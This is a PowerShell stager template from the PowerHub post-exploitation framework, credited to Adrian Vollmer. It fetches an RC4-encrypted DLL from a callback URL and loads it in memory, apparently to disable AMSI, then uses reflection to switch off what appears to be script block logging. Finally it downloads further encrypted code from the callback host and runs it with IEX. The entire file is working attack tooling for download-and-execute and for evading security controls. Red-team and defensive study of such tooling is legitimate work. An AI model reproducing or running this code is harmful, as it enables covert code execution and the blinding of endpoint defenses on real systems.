$CALLBACK_URL = "{{callback_url}}"
$WEBDAV_URL = "{{webdav_url}}"
$KEY = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")

Write-Host @"
  _____   _____  _  _  _ _______  ______ _     _ _     _ ______
 |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
 |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
                            written by Adrian Vollmer, 2018-2019
Run 'Help-PowerHub' for help
"@

function Decrypt-Code {
    # RC4
    param(
        [Byte[]]$buffer,
        [Byte[]]$key
  	)

    $s = New-Object Byte[] 256;
    $k = New-Object Byte[] 256;

    for ($i = 0; $i -lt 256; $i++)
    {
        $s[$i] = [Byte]$i;
        $k[$i] = $key[$i % $key.Length];
    }

    $j = 0;
    for ($i = 0; $i -lt 256; $i++)
    {
        $j = ($j + $s[$i] + $k[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
    }

    $i = $j = 0;
    for ($x = 0; $x -lt $buffer.Length; $x++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
        [int]$t = ($s[$i] + $s[$j]) % 256;
        $buffer[$x] = $buffer[$x] -bxor $s[$t];
    }

    $buffer
}


function Decrypt-String {
    param(
        [String]$string,
  	)
    $string = [System.Convert]::FromBase64String($string)
    $string = Decrypt-Code $string $KEY
    $string = [System.Text.Encoding]::ASCII.GetString($string)
    $string
}

$method = Decrypt-String "{{string0}}"

if(-not ([System.Management.Automation.PSTypeName]"$method").Type) {
    $K=new-object net.webclient
    $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
    $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
    $DLL = $K.downloadstring($CALLBACK_URL+'l')
    $DLL = [System.Convert]::FromBase64String($DLL)
    $DLL = Decrypt-Code $DLL $KEY
    $DLL = [System.Text.Encoding]::ASCII.GetString($DLL)
    [Reflection.Assembly]::Load([Convert]::FromBase64String($DLL)) | Out-Null
}

IEX "[$method]::Disable()"

$string1 = Decrypt-String "{{string1}}"
$string2 = Decrypt-String "{{string2}}"
$string3 = Decrypt-String "{{string3}}"
$string4 = Decrypt-String "{{string4}}"
$string5 = Decrypt-String "{{string5}}"

$settings = [Ref].Assembly.GetType($string1).GetField($string2,$string3).GetValue($null);
$settings[$string4] = @{}
$settings[$string4].Add($string5, "0")

$K=new-object net.webclient
$K.proxy=[Net.WebRequest]::GetSystemWebProxy()
$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
$code = Decrypt-String ($K.downloadstring($CALLBACK_URL+'1'))

IEX $code
